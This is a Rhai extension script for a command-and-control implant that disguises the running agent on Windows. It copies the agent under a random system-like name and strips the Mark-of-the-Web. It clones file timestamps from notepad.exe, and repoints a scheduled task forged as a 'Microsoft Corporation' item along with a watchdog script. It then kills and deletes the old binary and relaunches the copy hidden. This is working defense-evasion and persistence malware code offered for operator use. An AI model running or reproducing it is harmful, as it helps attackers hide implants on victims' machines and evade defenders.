// extensions/masquerade.rhai
//
// STANDALONE masquerade: re-drops the RUNNING AGENT under a NEW NAME with
// PLAUSIBLE TIMESTAMPS, then cuts over to it (kills the old process,
// deletes the old exe, starts the new one). No dependency on persist_sf2,
// task_watchdog, or any prior drop - run it on a fresh box with nothing
// else deployed and it still works end to end.
//
// Integration with the other extensions is OPTIONAL and automatic: if a
// persist task <LABEL> or a watchdog.ps1 from task_watchdog happens to
// exist, they are repointed at the new exe. If they don't exist, those
// steps are skipped silently.
//
// TWO HARD LIMITS - know them before relying on this:
//   1. A LIVE process cannot be renamed from userland. The process name
//      comes from the image file; the currently running agent keeps its
//      old name until the next start. The cutover handles this: the new
//      name goes live when the detached child kills the old process and
//      starts the new exe.
//   2. Renaming does NOT change the hash. Defender cloud reputation
//      follows content, not filename. A burned payload stays burned -
//      this helps only against name-based signatures and eyeballs.
//
// SOURCE (what gets masqueraded), in order:
//   1. arg 3 if given
//   2. internal_self_path() - the process THIS extension runs inside
//      (aborts with instructions if that turns out to be an interpreter
//      such as powershell.exe - pass the real binary as arg 3)
//
// DESTINATION: %LOCALAPPDATA%\Programs\<NEWNAME>\<NEWNAME>.exe - a fresh
// per-user software dir, created if needed. Independent of any other
// script's directories.
//
// Usage
//   extension load masquerade                 (random name, full cutover)
//   extension load masquerade WinSyncHost
//   extension load masquerade WinSyncHost MyLabel [C:\path\to\binary.exe] [nokill]
//
//   arg1  new process/file name (random if omitted)
//   arg2  label - ONLY used to detect persist/watchdog to repoint
//   arg3  explicit source binary (needed for in-memory agents)
//   arg4  "nokill" -> copy/backdate/repoint only, no cutover
//
// Return JSON
//   { "result", "version", "source_path", "new_name", "new_path",
//     "timestamps_applied", "timestamp_source", "task_updated",
//     "watchdog_updated", "source_removed", "cutover",
//     "process_name_note", "warnings" }

// ── Config ────────────────────────────────────────────────────────────
let NEWNAME = "";
if args.len() > 0 {
    let n = args[0];
    n.trim();
    if n.len() > 0 { NEWNAME = n; }
}

// Used ONLY to detect an existing persist task / watchdog to repoint.
let LABEL = "SystemUpdateHelper";
if args.len() > 1 {
    let a = args[1];
    a.trim();
    if a.len() > 0 { LABEL = a; }
}

// Explicit source binary. Default: the running process (internal_self_path).
let CUSTOM_BINARY = "";
if args.len() > 2 {
    let cb = args[2];
    cb.trim();
    if cb.len() > 3 { CUSTOM_BINARY = cb; }
}

// Cutover (kill old + start new) runs by default. "nokill" skips it.
let NOKILL = false;
if args.len() > 3 {
    let nk = args[3];
    nk.trim();
    if nk == "nokill" || nk == "NOKILL" || nk == "skip" { NOKILL = true; }
}

// ── Platform guard ────────────────────────────────────────────────────
let is_windows = internal_env("SystemRoot").contains("Windows");
if !is_windows {
    return "{\"result\":\"error\",\"version\":\"1.2\"," +
           "\"detail\":\"masquerade is Windows-only\"}";
}

print_log("[masquerade] label=" + LABEL + "  requested_name='" + NEWNAME + "'");
print_log("[masquerade] build v1.2 2026-11-12 - STANDALONE: masquerades the running agent; persist/watchdog repoint only if present");

fn jesc(s) {
    let r = s;
    r.replace("\\", "\\\\");
    r.replace("\"", "'");
    r.replace("\r", " ");
    r.replace("\n", " ");
    r
}

fn valid_name(n) {
    if n.len() < 3 || n.len() > 32 { return false; }
    if n.contains("\\") || n.contains("/") || n.contains(".") ||
       n.contains(" ") || n.contains(":") || n.contains("\"") ||
       n.contains("'") || n.contains(";") {
        return false;
    }
    true
}

// ── Resolve the SOURCE binary ─────────────────────────────────────────
let src_path = "";
if CUSTOM_BINARY.len() > 3 {
    src_path = CUSTOM_BINARY;
} else {
    src_path = internal_self_path();
    src_path.trim();
}
if src_path.len() < 3 || src_path.contains("Error") {
    return "{\"result\":\"error\",\"version\":\"1.2\"," +
           "\"detail\":\"could not determine the running binary - pass it explicitly as arg 3\"}";
}

// Interpreter / system-binary guard: if the agent is in-memory, the
// "running binary" is the host process - copying IT would be pointless.
if CUSTOM_BINARY.len() < 3 {
    let is_interpreter =
        src_path.contains("\\Windows\\System32\\")  ||
        src_path.contains("\\Windows\\SysWOW64\\")  ||
        src_path.ends_with("powershell.exe")         ||
        src_path.ends_with("cmd.exe")                ||
        src_path.ends_with("wscript.exe")            ||
        src_path.ends_with("cscript.exe")            ||
        src_path.ends_with("mshta.exe")              ||
        src_path.ends_with("rundll32.exe");
    if is_interpreter {
        return "{\"result\":\"error\",\"version\":\"1.2\"," +
               "\"detail\":\"the running process is a host interpreter (" + jesc(src_path) + ") - " +
               "pass the agent EXE as arg 3: ext:load masquerade <name> " + LABEL + " C:\\\\path\\\\to\\\\agent.exe\"}";
    }
}

let src_ok = exec_os_timeout(
    "if (Test-Path -LiteralPath '" + src_path + "') { 'OK' }",
    8
);
if !src_ok.contains("OK") {
    return "{\"result\":\"error\",\"version\":\"1.2\"," +
           "\"detail\":\"source binary not found at " + jesc(src_path) + "\"}";
}

// ── Name: use arg, or generate one ────────────────────────────────────
if NEWNAME.len() == 0 {
    let gen = exec_os_timeout(
        "$pre = @('Sys','Win','Svc','Net','Diag','Sync','Mon','Host','Data','Task','Upd','Sec','Wmi','Per'); " +
        "$mid = @('Mgr','Host','Core','Sync','Svc','Watch','Scan','Mon','Ctl','Aid','Run','Log','Notify','Tray'); " +
        "$pre[(Get-Random -Maximum $pre.Count)] + $mid[(Get-Random -Maximum $pre.Count)] + (Get-Random -Minimum 10 -Maximum 999)",
        15
    );
    gen.trim();
    if gen.len() >= 3 { NEWNAME = gen; }
}
if !valid_name(NEWNAME) {
    return "{\"result\":\"error\",\"version\":\"1.2\"," +
           "\"detail\":\"name '" + jesc(NEWNAME) + "' is not usable - 3-32 chars, " +
           "letters/digits/dash/underscore only, no dots or separators\"}";
}

// ── Destination: its OWN per-user dir, created if needed ──────────────
let dest_dir  = internal_env("LOCALAPPDATA") + "\\Programs\\" + NEWNAME;
let dest_path = dest_dir + "\\" + NEWNAME + ".exe";
if src_path == dest_path {
    return "{\"result\":\"error\",\"version\":\"1.2\"," +
           "\"detail\":\"binary is already named '" + NEWNAME + "' at that path - nothing to do\"}";
}
let dst_busy = exec_os_timeout(
    "if (Test-Path -LiteralPath '" + dest_path + "') { 'EXISTS' }",
    8
);
if dst_busy.contains("EXISTS") {
    return "{\"result\":\"error\",\"version\":\"1.2\"," +
           "\"detail\":\"destination " + jesc(dest_path) + " already exists - pick another name\"}";
}

// ── Copy + strip MOTW + verify ────────────────────────────────────────
exec_os_timeout(
    "if (-not (Test-Path -LiteralPath '" + dest_dir + "')) { New-Item -ItemType Directory -Path '" + dest_dir + "' -Force | Out-Null }",
    10
);
exec_os_timeout(
    "Copy-Item -LiteralPath '" + src_path + "' -Destination '" + dest_path + "' -Force -ErrorAction SilentlyContinue;" +
    "Remove-Item -LiteralPath '" + dest_path + "' -Stream 'Zone.Identifier' -Force -ErrorAction SilentlyContinue;" +
    "Unblock-File  -LiteralPath '" + dest_path + "' -ErrorAction SilentlyContinue",
    40
);
let cchk = exec_os_timeout(
    "if (Test-Path -LiteralPath '" + dest_path + "') { 'OK' }",
    8
);
if !cchk.contains("OK") {
    return "{\"result\":\"error\",\"version\":\"1.2\"," +
           "\"detail\":\"copy to " + jesc(dest_path) + " did not survive (on-write quarantine?)\"}";
}

// ── Backdate: clone timestamps from a reference system file ───────────
let ts_out = exec_os_timeout(
    "$src = 'C:\\Windows\\System32\\notepad.exe'; " +
    "if (-not (Test-Path -LiteralPath $src)) { " +
    "  $d = (Get-Date).AddDays(-(Get-Random -Minimum 200 -Maximum 1200)); " +
    "  $t = Get-Item -LiteralPath '" + dest_path + "'; " +
    "  $t.CreationTime = $d; $t.LastWriteTime = $d; $t.LastAccessTime = $d; 'RANDOM:' + $d.ToString('yyyy-MM-dd') " +
    "} else { " +
    "  $r = Get-Item -LiteralPath $src; " +
    "  $t = Get-Item -LiteralPath '" + dest_path + "'; " +
    "  $t.CreationTime = $r.CreationTime; $t.LastWriteTime = $r.LastWriteTime; $t.LastAccessTime = $r.LastAccessTime; " +
    "'CLONED:' + $r.LastWriteTime.ToString('yyyy-MM-dd') " +
    "}",
    15
);
let ts_applied = ts_out.contains("CLONED") || ts_out.contains("RANDOM");

// ── OPTIONAL integration: repoint persist/watchdog IF they exist ──────
// persist_sf2 / task_watchdog state is NOT required; these steps are
// pure bonus when the other extensions were deployed with the same label.
let wd_updated = false;
let old_stable_dir = internal_env("LOCALAPPDATA") + "\\Programs\\" + LABEL;
let wd_ps1 = old_stable_dir + "\\watchdog.ps1";
let wd_log = old_stable_dir + "\\watchdog.log";
let wd_exists = exec_os_timeout(
    "if (Test-Path -LiteralPath '" + wd_ps1 + "') { 'OK' }",
    8
);
if wd_exists.contains("OK") {
    let ps1 =
        "$ErrorActionPreference = 'SilentlyContinue'\n" +
        "$name = '" + NEWNAME + "'\n" +
        "$exe  = '" + dest_path + "'\n" +
        "$log  = '" + wd_log + "'\n" +
        "$alive = @(Get-Process -Name $name)\n" +
        "if ($alive.Count -eq 0) {\n" +
        "    Start-Process -FilePath $exe -WindowStyle Hidden\n" +
        "    Add-Content -LiteralPath $log -Value ((Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + '  started  ' + $exe)\n" +
        "}\n";
    internal_write(wd_ps1, ps1);
    let wchk = exec_os_timeout(
        "if (Test-Path -LiteralPath '" + wd_ps1 + "') { 'OK' }",
        8
    );
    wd_updated = wchk.contains("OK");
}

let task_updated = false;
let task_exists = exec_os_timeout(
    "Get-ScheduledTask -TaskName '" + LABEL + "' -ErrorAction SilentlyContinue | " +
    "Select-Object -ExpandProperty TaskName",
    10
);
if task_exists.contains(LABEL) {
    let session_user = exec_os("whoami 2>$null");
    session_user.trim();
    let xml_path = internal_env("TEMP") + "\\" + LABEL + "_repoint.xml";
    let xml =
        "<?xml version=\"1.0\"?>\n" +
        "<Task xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\" version=\"1.2\">\n" +
        "  <RegistrationInfo>\n" +
        "    <Author>Microsoft Corporation</Author>\n" +
        "    <Description>System update helper orchestration service.</Description>\n" +
        "  </RegistrationInfo>\n" +
        "  <Triggers>\n" +
        "    <LogonTrigger><Enabled>true</Enabled><UserId>" + session_user + "</UserId></LogonTrigger>\n" +
        "  </Triggers>\n" +
        "  <Principals>\n" +
        "    <Principal id=\"Author\">\n" +
        "      <UserId>" + session_user + "</UserId>\n" +
        "      <LogonType>InteractiveToken</LogonType>\n" +
        "      <RunLevel>LeastPrivilege</RunLevel>\n" +
        "    </Principal>\n" +
        "  </Principals>\n" +
        "  <Settings>\n" +
        "    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n" +
        "    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n" +
        "    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>\n" +
        "    <Hidden>false</Hidden>\n" +
        "  </Settings>\n" +
        "  <Actions>\n" +
        "    <Exec>\n" +
        "      <Command>" + dest_path + "</Command>\n" +
        "    </Exec>\n" +
        "  </Actions>\n" +
        "</Task>";
    internal_write(xml_path, xml);
    let rp_out = exec_os_timeout(
        "try { Register-ScheduledTask -TaskName '" + LABEL + "' " +
        "-Xml (Get-Content -LiteralPath '" + xml_path + "' -Raw) -Force -ErrorAction Stop | Out-Null; 'REPOINTED' } " +
        "catch { 'REPOINT_FAIL: ' + $_.Exception.Message }",
        25
    );
    task_updated = rp_out.contains("REPOINTED");
    exec_os_timeout(
        "Remove-Item -LiteralPath '" + xml_path + "' -Force -ErrorAction SilentlyContinue",
        5
    );
}

// ── Best-effort source removal (locked while running - expected) ──────
let src_removed = false;
let rm_out = exec_os_timeout(
    "try { Remove-Item -LiteralPath '" + src_path + "' -Force -ErrorAction Stop; 'REMOVED' } " +
    "catch { 'LOCKED: ' + $_.Exception.Message }",
    10
);
src_removed = rm_out.contains("REMOVED");

// ── Cutover (default ON): detached child kills the SOURCE process,
// deletes the SOURCE exe, and starts the new one. Detached because this
// extension runs INSIDE the source process - the Start-Process child
// survives the kill; the 5s sleep lets this JSON reach the panel first.
let cutover = "skipped";
if !NOKILL {
    let tmp_ps1 = internal_env("TEMP") + "\\cutover_" + NEWNAME + ".ps1";
    let ps1 =
        "$ErrorActionPreference = 'SilentlyContinue'\n" +
        "Start-Sleep -Seconds 5\n" +
        "$srcName = [IO.Path]::GetFileNameWithoutExtension('" + src_path + "')\n" +
        "Get-Process -Name $srcName | Stop-Process -Force\n" +
        "Get-Process | Where-Object { $_.Path -eq '" + src_path + "' } | Stop-Process -Force\n" +
        "Start-Sleep -Seconds 1\n" +
        "$removed = $false\n" +
        "try { Remove-Item -LiteralPath '" + src_path + "' -Force -ErrorAction Stop; $removed = $true } catch {}\n" +
        "Start-Process -FilePath '" + dest_path + "' -WindowStyle Hidden\n" +
        "Add-Content -LiteralPath '" + dest_dir + "\\switchover.log' -Value ((Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + '  cutover: killed ' + $srcName + '  old_removed=' + $removed + '  started " + dest_path + "')\n" +
        "Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force\n";
    internal_write(tmp_ps1, ps1);
    let cchk = exec_os_timeout(
        "if (Test-Path -LiteralPath '" + tmp_ps1 + "') { 'OK' }",
        8
    );
    if cchk.contains("OK") {
        exec_os_timeout(
            "Start-Process -FilePath powershell.exe " +
            "-ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-File','" + tmp_ps1 + "' " +
            "-WindowStyle Hidden | Out-Null",
            15
        );
        cutover = "initiated";
        print_log("[masquerade] cutover armed - source process dies in ~5s, new exe starts hidden");
    } else {
        cutover = "failed_to_arm";
        print_log("[masquerade] WARNING: could not arm cutover child");
    }
}

// ── Result ────────────────────────────────────────────────────────────
print_log("[masquerade] done: " + src_path + " -> " + dest_path);

return
    "{\"result\":\"success\"," +
    "\"version\":\"1.2\"," +
    "\"label\":\"" + LABEL + "\"," +
    "\"source_path\":\"" + jesc(src_path) + "\"," +
    "\"new_name\":\"" + NEWNAME + "\"," +
    "\"new_path\":\"" + jesc(dest_path) + "\"," +
    "\"timestamps_applied\":" + ts_applied + "," +
    "\"timestamp_source\":\"" + jesc(ts_out) + "\"," +
    "\"task_updated\":" + task_updated + "," +
    "\"watchdog_updated\":" + wd_updated + "," +
    "\"source_removed\":" + src_removed + "," +
    "\"cutover\":\"" + cutover + "\"," +
    "\"process_name_note\":\"" +
        if cutover == "initiated" {
            "CUTOVER ARMED: the source process is killed in ~5s and the new exe starts hidden under its new name - expect THIS SESSION to drop and a fresh callback within ~30s"
        } else {
            "the RUNNING process keeps its old name - start " + NEWNAME + ".exe yourself (or let your persistence fire) to run under the new name"
        } + "\"," +
    "\"warnings\":\"same bytes = same hash; if the source was hash-burned this does not help - regenerate the payload instead. task_updated/watchdog_updated are false when those other extensions were never deployed - that is normal, not an error.\"}";
